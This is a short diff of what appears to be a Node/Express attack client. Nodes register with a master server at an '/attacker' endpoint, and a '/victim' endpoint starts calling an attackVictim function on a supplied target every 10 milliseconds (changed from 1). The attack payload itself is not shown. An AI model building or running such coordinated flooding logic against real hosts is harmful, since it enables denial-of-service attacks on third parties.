@@ -46,10 +46,8 @@ function sendSensorData() {
 	  url:     serverAddress + "/attacker",
 	  body:    buildJSONbody()
 	}, function(error, res, body){
-	  //console.log(body);
 	  attackersData = JSON.parse(body);
 	});
-	//console.log(attackersData);
 }
 
 function sendPortToMaster() {
@@ -58,7 +56,6 @@ function sendPortToMaster() {
 	  url:     serverAddress + "/attacker",
 	  body:    JSON.stringify({"port": port, "id": id})
 	}, function(error, res, body){
-	  //console.log(body);
 	  setInterval(sendSensorData, 1000);
 	});	
 }
@@ -161,7 +158,7 @@ app.post("/election", function(req, res) {
 app.post("/victim", function(req, res) {
 	console.log("attacking...");
 	console.log(req.body.victim);
-	attackingInterval = setInterval(function () {attackVictim(req.body.victim)}, 1);
+	attackingInterval = setInterval(function () {attackVictim(req.body.victim)}, 10);
 	res.sendStatus(200);
 });
 
